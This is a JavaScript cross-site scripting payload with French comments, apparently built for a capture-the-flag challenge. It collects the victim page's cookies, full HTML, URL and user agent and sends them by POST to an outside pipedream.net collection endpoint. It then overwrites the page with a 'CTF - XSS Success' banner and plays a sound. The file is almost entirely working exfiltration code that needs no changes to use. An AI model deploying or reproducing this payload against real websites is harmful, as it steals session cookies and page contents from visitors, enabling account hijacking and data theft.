// Fonction pour récupérer les cookies
function grabCookies() {
    return document.cookie;
}

// Fonction pour récupérer tout le HTML de la page
function grabFullHTML() {
    return document.documentElement.outerHTML;
}

// Fonction pour envoyer les données au serveur
function sendDataToServer() {
    const cookies = grabCookies();
    const html = grabFullHTML();
    
    // Créer l'objet de données à envoyer
    const data = {
        cookies: cookies,
        html: html,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    // Envoyer les données via une requête POST
    fetch('https://eoppt5zj3no3twu.m.pipedream.net', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).catch(error => {
        console.error('Erreur lors de l\'envoi des données:', error);
    });
}

// Exécuter la fonction d'envoi
sendDataToServer();

// Remplace tout le contenu de la page par CTF sur fond noir
document.body.innerHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>CTF - XSS Success</title>
    <style>
        body {
            background: #000000;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
        }
        .ctf-container {
            text-align: center;
            color: #00ff00;
        }
        .ctf-title {
            font-size: 8em;
            font-weight: bold;
            text-shadow: 0 0 20px #00ff00;
            animation: glow 1.5s ease-in-out infinite alternate;
        }
        .ctf-subtitle {
            font-size: 2em;
            margin-top: 20px;
            color: #ffffff;
        }
        .hacker-text {
            font-size: 1.2em;
            color: #00ffff;
            margin-top: 30px;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00, 0 0 40px #00ff00; }
        }
    </style>
</head>
<body>
    <div class="ctf-container">
        <div class="ctf-title">CTF</div>
        <div class="ctf-subtitle">XSS Challenge Completed</div>
        <div class="hacker-text">🚩 Flag Captured Successfully</div>
    </div>
</body>
</html>
`;

// Optionnel : Ajouter un effet sonore (bip hacker)
var audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA');
audio.play();

// Console log pour confirmation
console.log('CTF XSS executed successfully!');
